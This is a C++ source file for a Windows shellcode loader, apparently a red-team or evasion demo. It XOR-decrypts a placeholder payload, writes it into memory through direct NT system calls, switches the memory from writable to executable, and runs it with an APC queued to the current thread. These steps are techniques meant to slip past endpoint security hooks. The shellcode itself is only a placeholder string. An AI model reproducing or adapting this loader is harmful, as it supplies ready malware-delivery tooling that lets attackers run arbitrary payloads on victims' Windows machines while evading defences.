#include <iostream>
#include "syscalls_demo.h"

// --- Set Payload ---
unsigned char shellcode[] = { "XOR'd SHELLCODE HERE"}; // Input 1
size_t shellcode_len = sizeof(shellcode);
char key[] = "ac"; // Input 2 (XOR Key)

// --- XOR Decryption Routine ---
void XOR(char* data, size_t data_len, char* key, size_t key_len) {
	
	int j;
	j = 0;
	for (int i = 0; i < data_len; i++) {
		if (j == key_len - 1) j = 0;
		data[i] = data[i] ^ key[j];
		j++;
	}
}

// --- Function for loader ---
void run(unsigned char* shellcode, size_t shellcode_len) {
	
	PVOID lbuffer = nullptr;
	HANDLE curproc = GetCurrentProcess();

	// Allocate memory with permissions RW
	NtAllocateVirtualMemory(curproc, &lbuffer, 0, &shellcode_len, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);

	// Write code into memory
	NtWriteVirtualMemory(curproc, lbuffer, shellcode, shellcode_len, nullptr);

	// Change permissions to RX
	ULONG old_protect;
	NtProtectVirtualMemory(curproc, &lbuffer, &shellcode_len, PAGE_EXECUTE_READ, &old_protect);

	// Create APC
	NtQueueApcThread(GetCurrentThread(), (PKNORMAL_ROUTINE)lbuffer, NULL, NULL, NULL);

	// Flush APC Queue (Execute)
	NtTestAlert();
}

// --- MAIN ---
int main(int argc, char** argv) {

	// --- Decrypt Shellcode ---
	XOR((char*)shellcode, shellcode_len, key, sizeof(key));

	// --- Run Payload ---
	run(shellcode, shellcode_len);
}
